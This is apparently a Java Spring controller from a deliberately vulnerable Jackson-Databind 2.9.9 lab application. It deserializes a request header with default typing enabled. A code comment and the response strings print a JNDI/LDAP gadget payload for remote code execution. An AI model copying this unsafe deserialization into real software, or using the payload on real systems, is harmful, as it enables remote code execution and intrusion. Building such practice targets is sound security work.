package com.nighter.jackson.vulnerableapp;

import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestHeader;
import org.springframework.web.bind.annotation.RestController;

import java.io.IOException;
import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;

@RestController
public class MainController {
    
    // ["ch.qos.logback.core.db.JNDIConnectionSource",{"jndiLocation":"ldap://127.0.0.1:1097/rce"}]

    @GetMapping("/")
    public String index(@RequestHeader(value="X-Api-Version", required=false) String apiVersion) throws JsonParseException, JsonMappingException, IOException {
        
        if(apiVersion == null) {
            return "[Jackson-Databind v.2.9.9] Vulnerable Application -- nighter@nighter.se\n\n <pre>Payload: X-Api-Version: [\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:9092/ExportObject\"}]</pre>";
        }

        try {
            ObjectMapper objectMapper = new ObjectMapper();
            objectMapper.enableDefaultTyping();
            Object obj = objectMapper.readValue(apiVersion.toString(), java.lang.Object.class); 
            objectMapper.writeValueAsString(obj); 
        } 
        catch (JsonParseException e)
        {
            return "[-] Payload wrong (hint): <pre>X-Api-Version: [\"ch.qos.logback.core.db.JNDIConnectionSource\",{\"jndiLocation\":\"ldap://127.0.0.1:9092/ExportObject\"}]</pre>";
        }

        return "[Jackson-Databind v.2.9.9] Vulnerable Application -- nighter@nighter.se";
    }
}
